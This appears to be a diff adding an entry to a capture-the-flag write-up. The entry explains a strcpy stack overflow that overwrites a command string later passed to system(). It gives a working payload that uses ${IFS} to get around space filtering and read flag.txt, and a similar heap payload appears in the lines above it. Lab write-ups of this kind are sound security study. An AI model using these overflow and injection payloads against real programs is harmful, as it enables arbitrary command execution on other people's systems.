@@ -69,3 +69,22 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt
 This overwrites `/bin/pwd` with our command and prints the flag. 
 
 Root cause: unsafe input handling and execution of user-controlled heap data.
+
+---
+
+### ID 525 — Input Injection 1
+
+## Approach:
+The program reads my input into `name` and then calls `fun()`, which has two small stack buffers:
+
+```
+char c[10];       // holds "uname"
+char buffer[10];  // holds my input
+strcpy(buffer, name); // vulnerable
+```
+
+By overflowing buffer with more than 10 characters, I overwrite c with my own command.
+
+Payload: AAAAAAAAAAcat${IFS}flag.txt (10 A’s overflow buffer, the rest overwrites c)
+
+Result: system() executes cat flag.txt.
